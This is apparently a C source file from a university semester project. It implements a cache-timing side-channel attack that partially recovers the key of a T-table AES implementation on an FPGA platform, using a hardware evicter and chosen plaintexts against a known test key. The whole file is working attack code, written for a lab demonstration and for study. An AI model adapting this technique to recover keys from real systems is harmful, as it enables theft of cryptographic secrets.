/**
 * Semester project Fall 2022
 * @file paper_attack.c
 * @author Matteo Oldani
 * @version 0.1
 * @date 2023-01-18
 * 
 * This code implements the controller and data analysis 
 * for the Attacker IP implementing a partial key recovery 
 * attack on the vulnerable implementation of AES 
 * 
 */

#include <stdio.h>
#include "platform.h"
#include "xil_printf.h"
#include <xreader_timer_evicter.h>
#include "aes.h"

#define ANSI_COLOR_RED     "\x1b[31m"
#define ANSI_COLOR_GREEN   "\x1b[32m"
#define ANSI_COLOR_YELLOW  "\x1b[33m"
#define ANSI_COLOR_BLUE    "\x1b[34m"
#define ANSI_COLOR_MAGENTA "\x1b[35m"
#define ANSI_COLOR_CYAN    "\x1b[36m"
#define ANSI_COLOR_RESET   "\x1b[0m"

#define STRIDE 1

volatile unsigned int results[1024];
unsigned int attack_results[256*256];
XReader_timer_evicter evicter;


void rand_ptxt(unsigned char *ptxt, int exclude){
	for(int i=0; i<16; i++){
		if(i==exclude){continue;}
		ptxt[i] = (unsigned char)(rand()%256);
	}
}

void xil_printf_colored(unsigned value){
	if(value <= 12){
		xil_printf(ANSI_COLOR_GREEN);
		xil_printf("%u  ", value);
		xil_printf(ANSI_COLOR_RESET);
	}else{
		xil_printf("%d  ", value);
	}
}

void evict(UINTPTR array, int n_evictions, int time_after_eviction, int stride){
	results[0] = n_evictions;
	results[1] = stride;
	results[2] = time_after_eviction; // 0 if no, 1 for yes

	XReader_timer_evicter_Set_array_r(&evicter, array);
	XReader_timer_evicter_Start(&evicter);
	while(!XReader_timer_evicter_IsDone(&evicter));
}


int main()
{
    init_platform();

	unsigned char key[16]  = {15,0,73,214,97,20,3,111,139,202,70,62,103,249,4,46};
	unsigned char ptxt[16] = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};

	unsigned char ctxt[16];
	unsigned char recovered_key[16][8];
	unsigned char number_of_iterations[16];

	for(int i=0; i<16; i++){
		number_of_iterations[i] = 0;
	}

	UINTPTR tables[4] = {(UINTPTR)te0, (UINTPTR)te1, (UINTPTR)te2, (UINTPTR)te3};

	// Array used to store the access patterns
	int cache_hit[256];


    xil_printf("\e[1;1H\e[2J");
    xil_printf(ANSI_COLOR_YELLOW);
    xil_printf("################ STARTING THE ATTACK ################\n\n\r");
    xil_printf(ANSI_COLOR_RESET);

    xil_printf("The address of te0 is: 0x%p\n\r", tables[0]);
    xil_printf("The address of te1 is: 0x%p\n\r", tables[1]);
    xil_printf("The address of te2 is: 0x%p\n\r", tables[2]);
    xil_printf("The address of te3 is: 0x%p\n\r", tables[3]);

    // I am focusing on the first cache line
    int number_of_eviction = 16;
    int evict_stride = STRIDE * 4;
    int time_after_evict = 0;

	XReader_timer_evicter_Initialize(&evicter, 0);
	XReader_timer_evicter_Set_c_results(&evicter, (UINTPTR) results);


	evict(tables[0], number_of_eviction, time_after_evict, evict_stride);
	evict(tables[1], number_of_eviction, time_after_evict, evict_stride);
	evict(tables[2], number_of_eviction, time_after_evict, evict_stride);
	evict(tables[3], number_of_eviction, time_after_evict, evict_stride);

	// For every table
	for(int t =0; t<4; t++){
		// for every byte of the key (which depend on the table we are looking at)
		for(int a=t; a<16; a=a+4){


			for(int i=0; i<256; i++){
				cache_hit[i] = 1;
			}

			int go_on = 1;
			while(go_on){
				//loop over all the possible positions
				for(int b=0; b<256; b++){

					// create random ptxt with fixed i byte (to b)
					ptxt[a] = b;
					rand_ptxt(ptxt, a);

					// if the plain text has already been removed, continue
					if(cache_hit[b] == 0){
						continue;
					}

					encrypt(key, ptxt, ctxt);
					evict(tables[t], number_of_eviction, time_after_evict, evict_stride);
					number_of_iterations[a]++;

					// check if the first row of the table is in cache
					// do it without checking the first value which is
					// always kept in cache
					if(results[1] != 12){
						// this is enough to still consider the plain text
						cache_hit[b] = 0;
					}
				}

				int count_valid = 0;
				for(int i=0; i<256; i++){
					if(cache_hit[i] == 1){
						count_valid += 1;
					}
				}

				if(count_valid < 9){
					go_on = 0;
					int count = 0;
					for(int i=0; i<256; i++){
						if(cache_hit[i] == 1){
							recovered_key[a][count] = i;
							count++;
						}
					}
				}

			}

		}
	}

	for(int i=0; i<16; i++){
		xil_printf("Possible bytes for key[%2d] = %3d: ", i, key[i]);
		for(int j=0; j<8; j++){
			xil_printf("%3d ", recovered_key[i][j]);
		}
		xil_printf("  --> Encryption required: %d", number_of_iterations[i]);
		xil_printf("\n\r");
	}


    cleanup_platform();
    return 0;
}
